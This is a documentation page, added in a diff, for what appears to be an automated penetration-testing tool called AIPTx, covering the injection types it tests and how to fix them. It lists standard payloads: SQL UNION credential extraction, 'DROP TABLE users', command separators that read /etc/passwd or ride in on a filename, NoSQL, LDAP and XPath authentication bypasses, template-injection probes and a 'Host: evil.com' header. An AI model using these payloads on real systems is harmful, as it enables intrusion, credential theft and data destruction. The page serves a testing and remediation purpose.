@@ -1,0 +1,232 @@
+---
+title: Injection Vulnerabilities
+description: 'SQL, NoSQL, command, and other injection vulnerability testing'
+---
+
+# Injection Vulnerabilities
+
+Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. AIPTx comprehensively tests for all common injection types.
+
+## SQL Injection
+
+### Types Detected
+
+| Type | Description | Example |
+|------|-------------|---------|
+| Classic | Direct query manipulation | `' OR '1'='1` |
+| Union-based | Data extraction via UNION | `' UNION SELECT * FROM users--` |
+| Blind (Boolean) | True/false response analysis | `' AND 1=1--` |
+| Blind (Time-based) | Response time analysis | `' AND SLEEP(5)--` |
+| Error-based | Database error messages | `' AND EXTRACTVALUE(...)` |
+| Stacked Queries | Multiple statement execution | `'; DROP TABLE users;--` |
+
+### Testing Approach
+
+AIPTx tests SQL injection by:
+
+1. **Parameter Discovery** - Identifying all injectable parameters
+2. **Database Fingerprinting** - Detecting database type (MySQL, PostgreSQL, MSSQL, Oracle)
+3. **Payload Generation** - Context-aware payloads for each database
+4. **Exploitation** - Validating with data extraction attempts
+
+### Example Finding
+
+```json
+{
+  "title": "SQL Injection in User Search",
+  "severity": "critical",
+  "endpoint": "POST /api/users/search",
+  "parameter": "query",
+  "database": "PostgreSQL 14.2",
+  "poc": {
+    "payload": "' UNION SELECT username, password, email FROM users--",
+    "result": "Retrieved 1,247 user credentials"
+  }
+}
+```
+
+## NoSQL Injection
+
+### Databases Covered
+
+- MongoDB
+- CouchDB
+- Redis
+- Cassandra
+- DynamoDB
+
+### Attack Vectors
+
+```javascript
+// Operator injection
+{ "username": { "$ne": "" }, "password": { "$ne": "" } }
+
+// JavaScript injection
+{ "$where": "this.username == 'admin'" }
+
+// Array injection
+{ "username": "admin", "password": { "$gt": "" } }
+```
+
+### Testing Methodology
+
+1. Identify NoSQL endpoints
+2. Test operator injection (`$ne`, `$gt`, `$lt`, `$regex`)
+3. Test JavaScript injection in `$where` clauses
+4. Test array/object manipulation
+
+## Command Injection
+
+### OS Command Injection
+
+AIPTx tests for command injection in:
+
+- File operations
+- System utilities
+- Shell commands
+- Process execution
+
+### Payloads
+
+```bash
+# Separator-based
+; ls -la
+| cat /etc/passwd
+`whoami`
+$(id)
+
+# Encoding bypass
+%0a ls
+%0d%0a id
+```
+
+### Example Finding
+
+```json
+{
+  "title": "OS Command Injection in File Converter",
+  "severity": "critical",
+  "endpoint": "POST /api/convert",
+  "parameter": "filename",
+  "poc": {
+    "payload": "test.pdf; cat /etc/passwd",
+    "result": "Root file contents disclosed"
+  }
+}
+```
+
+## LDAP Injection
+
+### Testing Coverage
+
+- Authentication bypass
+- Information disclosure
+- Filter manipulation
+
+### Payloads
+
+```
+# Authentication bypass
+*)(&
+*)(uid=*))(|(uid=*
+
+# Information disclosure
+*)(objectClass=*
+```
+
+## Template Injection (SSTI)
+
+### Supported Frameworks
+
+| Framework | Language | Detection |
+|-----------|----------|-----------|
+| Jinja2 | Python | `{{7*7}}` → `49` |
+| Twig | PHP | `{{7*7}}` → `49` |
+| Freemarker | Java | `${7*7}` → `49` |
+| Velocity | Java | `#set($x=7*7)$x` |
+| Handlebars | JavaScript | `{{constructor.constructor('return 7*7')()}}` |
+
+### Exploitation Chain
+
+1. **Detection** - Identify template engine
+2. **Context** - Determine injection context
+3. **Sandbox Escape** - Test for RCE capability
+4. **Exploitation** - Execute arbitrary code
+
+## XPath Injection
+
+### Testing Scenarios
+
+```xpath
+# Authentication bypass
+' or '1'='1
+
+# Data extraction
+' or 1=1 or '1'='1
+```
+
+## Header Injection
+
+### Types
+
+- Host header injection
+- X-Forwarded-For manipulation
+- Email header injection (CRLF)
+
+### Example
+
+```http
+Host: evil.com
+X-Forwarded-For: 127.0.0.1
+```
+
+## Remediation Guidance
+
+<AccordionGroup>
+  <Accordion title="SQL Injection">
+    **Prevention:**
+    - Use parameterized queries / prepared statements
+    - Implement input validation
+    - Apply least privilege database accounts
+
+    ```javascript
+    // Bad
+    const query = `SELECT * FROM users WHERE id = ${userId}`;
+
+    // Good
+    const query = 'SELECT * FROM users WHERE id = ?';
+    db.execute(query, [userId]);
+    ```
+  </Accordion>
+
+  <Accordion title="Command Injection">
+    **Prevention:**
+    - Avoid shell commands when possible
+    - Use allowlists for permitted characters
+    - Escape special characters
+
+    ```javascript
+    // Bad
+    exec(`convert ${filename}`);
+
+    // Good
+    execFile('convert', [filename]);
+    ```
+  </Accordion>
+
+  <Accordion title="NoSQL Injection">
+    **Prevention:**
+    - Validate input types
+    - Sanitize user input
+    - Use query builders with parameterization
+
+    ```javascript
+    // Bad
+    db.users.find({ username: req.body.username });
+
+    // Good
+    const username = String(req.body.username);
+    db.users.find({ username });
+    ```
+  </Accordion>
+</AccordionGroup>
